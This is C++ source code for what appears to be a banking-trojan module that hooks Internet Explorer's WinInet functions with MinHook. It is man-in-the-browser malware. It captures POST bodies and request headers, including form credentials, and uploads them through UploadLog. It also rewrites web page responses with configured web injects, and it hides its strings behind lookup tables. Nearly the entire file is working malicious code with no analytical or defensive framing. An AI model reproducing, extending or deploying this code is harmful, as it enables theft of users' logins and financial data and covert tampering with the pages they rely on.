#include "..\Common.h"
#include "..\MinHook\include\MinHook.h"
#include "BrowserUtils.h"
#include "WebInjects.h"
#include "..\Utils.h"
#include <WinInet.h>

struct Request
{
   char     *host;
   char     *path;
   char     *buffer;
   BOOL      post;
   BOOL      postSent;
   char     *postData;
   DWORD     postDataSize;
   HINTERNET hInternet;
   DWORD     bufferSize;
   BOOL      replace;
   BOOL      isRead;
   DWORD     sent;
   AiList   *injects;
};

static Request          g_requests[MAX_REQUESTS] = { 0 };
static CRITICAL_SECTION g_critSec;

static BOOL (__stdcall *Real_InternetReadFile)(LPVOID hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead);
static BOOL (__stdcall *Real_HttpSendRequestW)(LPVOID hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength);
static LPVOID (__stdcall *Real_InternetConnectW)(LPVOID hInternet, LPCWSTR lpszServerName, WORD nServerPort, LPCWSTR lpszUserName, LPCWSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext);
static LPVOID (__stdcall *Real_HttpOpenRequestW)(LPVOID hConnect, LPCWSTR lpszVerb, LPCWSTR lpszObjectName, LPCWSTR lpszVersion, LPCWSTR lpszReferrer, LPCWSTR* lplpszAcceptTypes, DWORD dwFlags, DWORD_PTR dwContext);
static BOOL (__stdcall *Real_InternetQueryDataAvailable)(HINTERNET hFile, LPDWORD lpdwNumberOfBytesAvailable, DWORD dwFlags, DWORD_PTR dwContext);
static BOOL (__stdcall *Real_InternetCloseHandle)(HINTERNET hInternet);
static BOOL (__stdcall *Real_InternetReadFileEx)(HINTERNET hFile, LPINTERNET_BUFFERS lpBuffersOut, DWORD dwFlags, DWORD_PTR dwContext);
static BOOL (__stdcall *Real_InternetWriteFile) (HINTERNET hFile, LPCVOID lpBuffer, DWORD dwNumberOfBytesToWrite, LPDWORD lpdwNumberOfBytesWritten);


static void AddRequest(PVOID hInternet, PCHAR host)
{
   Funcs::pEnterCriticalSection(&g_critSec);
   for(DWORD i = 0; i < MAX_REQUESTS; ++i)
   {
      if(!g_requests[i].hInternet)
      {
         g_requests[i].hInternet = hInternet;
         g_requests[i].host      = host;
         break;
      }
   }
   Funcs::pLeaveCriticalSection(&g_critSec);
}

static void RemoveRequest(void* hInternet)
{
   Funcs::pEnterCriticalSection(&g_critSec);
   for(DWORD i = 0; i < MAX_REQUESTS; ++i)
   {
      if(g_requests[i].hInternet == hInternet)
      {
         Funcs::pFree(g_requests[i].buffer);
         Funcs::pFree(g_requests[i].host);
         Funcs::pFree(g_requests[i].path);
         Funcs::pFree(g_requests[i].postData);
         Funcs::pMemset(&g_requests[i], 0, sizeof(g_requests[i])); 
         break;
      }
   }
   Funcs::pLeaveCriticalSection(&g_critSec);
}

static Request *GetRequest(void* hInternet)
{
   Funcs::pEnterCriticalSection(&g_critSec);
   for(DWORD i = 0; i < MAX_REQUESTS; ++i)
   {
      if(g_requests[i].hInternet == hInternet)
      {
         Funcs::pLeaveCriticalSection(&g_critSec);
         return &g_requests[i];
      }
   }
   Funcs::pLeaveCriticalSection(&g_critSec);
   return NULL;
}

static BOOL __stdcall My_InternetWriteFile(HINTERNET hFile, LPCVOID lpBuffer, DWORD dwNumberOfBytesToWrite, LPDWORD lpdwNumberOfBytesWritten)
{
   Request *request = GetRequest(hFile);
   if(request)
   {
      if(request->post)
      {
         request->postData     = (char *) Alloc(dwNumberOfBytesToWrite);
         Funcs::pMemcpy(request->postData, lpBuffer, dwNumberOfBytesToWrite);
         request->postDataSize = dwNumberOfBytesToWrite;
      }
   }
   return Real_InternetWriteFile(hFile, lpBuffer, dwNumberOfBytesToWrite, lpdwNumberOfBytesWritten);
}

static BOOL __stdcall My_HttpSendRequestW(HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength)
{
   BOOL ret = Real_HttpSendRequestW(hRequest, lpszHeaders, dwHeadersLength, lpOptional, dwOptionalLength);
   Request *request = GetRequest(hRequest);
   if(request)
   {
      if(request->post)
      {
         request->postData     = (char *) Alloc(dwOptionalLength);
         Funcs::pMemcpy(request->postData, lpOptional, dwOptionalLength);
         request->postDataSize = dwOptionalLength;
      }
   }
   return ret;
}
 
static HINTERNET __stdcall My_InternetConnectW(HINTERNET hInternet, LPCWSTR lpszServerName, INTERNET_PORT nServerPort, LPCWSTR lpszUserName, LPCWSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext)
{
   HINTERNET Ret = Real_InternetConnectW(hInternet, lpszServerName, nServerPort, lpszUserName, lpszPassword, dwService, dwFlags, dwContext);
   if(Ret)
   {
      char *host = Utf16toUtf8((wchar_t *) lpszServerName);
      AddRequest(Ret, host);
   }
   return Ret;
}

static HINTERNET __stdcall My_HttpOpenRequestW(HINTERNET hConnect, LPCWSTR lpszVerb, LPCWSTR lpszObjectName, LPCWSTR lpszVersion, LPCWSTR lpszReferrer, LPCWSTR* lplpszAcceptTypes, DWORD dwFlags, DWORD_PTR dwContext)
{
   Request *request = GetRequest(hConnect);
   if(request)
   {
      char *path         = Utf16toUtf8((wchar_t *) lpszObjectName);
      char *lpszVerbA    = Utf16toUtf8((wchar_t *) lpszVerb);
      request->post      = !Funcs::pLstrcmpA(lpszVerbA, Strs::ie1);
      request->path      = path;
      request->injects   = GetWebInject(request->host, path);
      Funcs::pFree(lpszVerbA);
   }
   HINTERNET ret = Real_HttpOpenRequestW(hConnect, lpszVerb, lpszObjectName, lpszVersion, lpszReferrer, lplpszAcceptTypes, dwFlags, dwContext);
   if(!ret)
      RemoveRequest(hConnect);
   else if(request)
      request->hInternet = ret;
   return ret;
}

static BOOL __stdcall My_InternetQueryDataAvailable(HINTERNET hFile, LPDWORD lpdwNumberOfBytesAvailable, DWORD dwFlags, DWORD_PTR dwContext)
{
   BOOL ret = Real_InternetQueryDataAvailable(hFile, lpdwNumberOfBytesAvailable, dwFlags, dwContext);
   Request *request = GetRequest(hFile);
   if(request && request->injects)
      *lpdwNumberOfBytesAvailable = 2048;
   return ret;
}

static BOOL __stdcall My_InternetReadFile(HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead)
{
   Request *request = GetRequest(hFile);
   if(request)
   {
      if(request->post && !request->postSent)
      {
         char   *buffer      = NULL;
         DWORD   headersSize = 0;
         Funcs::pHttpQueryInfoA(hFile, HTTP_QUERY_FLAG_REQUEST_HEADERS | HTTP_QUERY_RAW_HEADERS_CRLF, buffer, &headersSize, NULL);
         buffer = (char *) Alloc(headersSize + request->postDataSize + 1);
         Funcs::pHttpQueryInfoA(hFile, HTTP_QUERY_FLAG_REQUEST_HEADERS | HTTP_QUERY_RAW_HEADERS_CRLF, buffer, &headersSize, NULL);
         Funcs::pMemcpy(buffer + headersSize, request->postData, request->postDataSize);
         buffer[headersSize] = 0;

         BOOL inject;
         char *url = GetUrlHostPath(request->host, request->path, &inject); 
         UploadLog(Strs::ieName, url, buffer, inject); 
         Funcs::pFree(url);
         Funcs::pFree(buffer);
      }
      if(request->injects)
      {
         for(;!request->isRead;)
         {
            BOOL ret = Real_InternetReadFile(hFile, lpBuffer, dwNumberOfBytesToRead, lpdwNumberOfBytesRead);
            if (!ret)
            {
               if(Funcs::pGetLastError() == ERROR_IO_PENDING)
               {
                  //todo: use InternetStatusCallback instead of this hack
                  for(DWORD i = 0; *lpdwNumberOfBytesRead == 0; ++i)
                  {
                     if(i == 15)
                     {
                        RemoveRequest(hFile);
                        return FALSE;
                     }
                     Funcs::pSleep(100);
                  }
               }
               else
               {
                  RemoveRequest(hFile);
                  return FALSE;
               }
            }

            if(*lpdwNumberOfBytesRead == 0)
            {
               if(request->buffer)
               {
                  request->buffer[request->bufferSize] = 0;   
                  if(Funcs::pStrStrIA(request->buffer, Strs::ie2))
                  {
                     ReplaceWebInjects(&request->buffer, request->injects);
                     request->bufferSize = Funcs::pLstrlenA(request->buffer);
                  }
               }
               request->isRead = TRUE;
                break;
            }
            else
            {
               if(!request->buffer)
                  request->buffer = (char *) Alloc(*lpdwNumberOfBytesRead + 1);
               else
                  request->buffer = (char *) ReAlloc(request->buffer, request->bufferSize + *lpdwNumberOfBytesRead + 1);
               Funcs::pMemcpy(request->buffer + request->bufferSize, lpBuffer, *lpdwNumberOfBytesRead);
               request->bufferSize += *lpdwNumberOfBytesRead;
            }
         }

         DWORD diff = request->bufferSize - request->sent;
         if(diff >= dwNumberOfBytesToRead)
         {
            Funcs::pMemcpy(lpBuffer, request->buffer + request->sent, dwNumberOfBytesToRead);
            *lpdwNumberOfBytesRead = dwNumberOfBytesToRead;
            request->sent += *lpdwNumberOfBytesRead;
         }
         else if(diff > 0)
         {
            Funcs::pMemcpy(lpBuffer, request->buffer + request->sent, diff);
            *lpdwNumberOfBytesRead = diff;
            request->sent += *lpdwNumberOfBytesRead;
         }
         else
         {
            RemoveRequest(hFile);
            *lpdwNumberOfBytesRead = 0;
         }
         return TRUE;
      }
      else
         RemoveRequest(hFile);
   }
   return Real_InternetReadFile(hFile, lpBuffer, dwNumberOfBytesToRead, lpdwNumberOfBytesRead);
}

static BOOL __stdcall My_InternetReadFileEx(HINTERNET hFile, LPINTERNET_BUFFERS lpBuffersOut, DWORD dwFlags, DWORD_PTR dwContext)
{
   BOOL ret = Real_InternetReadFileEx(hFile, lpBuffersOut, dwFlags, dwContext);
   Request *request = GetRequest(hFile);
   if(request)
      RemoveRequest(hFile);

   char   *headers      = NULL;
   DWORD   headersSize = 0;
   Funcs::pHttpQueryInfoA(hFile, HTTP_QUERY_RAW_HEADERS_CRLF, headers, &headersSize, NULL);
   headers = (char *) Alloc(headersSize + 1);
   Funcs::pHttpQueryInfoA(hFile, HTTP_QUERY_RAW_HEADERS_CRLF, headers, &headersSize, NULL);
   headers[headersSize] = 0;

   char *str    = Strs::ie3; //I hate IE rather hack it then understand it
   DWORD strLen = Funcs::pLstrlenA(str);

   char *contentType = FindStrSandwich(headers, Strs::fc8, Strs::winNewLine);
   if(Funcs::pStrStrIA((char *) lpBuffersOut->lpvBuffer, Strs::ie2) && lpBuffersOut->dwBufferLength >= strLen)
   {
      lpBuffersOut->dwBufferLength = strLen;
      Funcs::pLstrcpyA((char *) lpBuffersOut->lpvBuffer, str);
      Funcs::pFree(headers);
      return TRUE;
   }
   Funcs::pFree(headers);
   return ret;
}

static BOOL __stdcall My_InternetCloseHandle(HINTERNET hInternet)
{
   Request *request = GetRequest(hInternet);
   if(request)
      RemoveRequest(hInternet);
   return Real_InternetCloseHandle(hInternet);
}

void HookIe()
{
   MH_Initialize();
   LoadWebInjects();         
   Funcs::pInitializeCriticalSection(&g_critSec);
   MH_CreateHookApi(Strs::wWininet, Strs::ie4, My_InternetCloseHandle, (LPVOID *) &Real_InternetCloseHandle);
   MH_CreateHookApi(Strs::wWininet, Strs::ie5, My_InternetQueryDataAvailable, (LPVOID *) &Real_InternetQueryDataAvailable);
   MH_CreateHookApi(Strs::wWininet, Strs::ie6, My_HttpOpenRequestW, (LPVOID *) &Real_HttpOpenRequestW);
   MH_CreateHookApi(Strs::wWininet, Strs::ie7, My_InternetConnectW, (LPVOID *) &Real_InternetConnectW);
   MH_CreateHookApi(Strs::wWininet, Strs::ie8, My_HttpSendRequestW, (LPVOID *) &Real_HttpSendRequestW);
   MH_CreateHookApi(Strs::wWininet, Strs::ie9, My_InternetReadFile, (LPVOID *) &Real_InternetReadFile);
   MH_CreateHookApi(Strs::wWininet, Strs::ie10, My_InternetReadFileEx, (LPVOID *) &Real_InternetReadFileEx);
   MH_CreateHookApi(Strs::wWininet, Strs::ie11, My_InternetWriteFile, (LPVOID *) &Real_InternetWriteFile);
   MH_EnableHook(MH_ALL_HOOKS);
}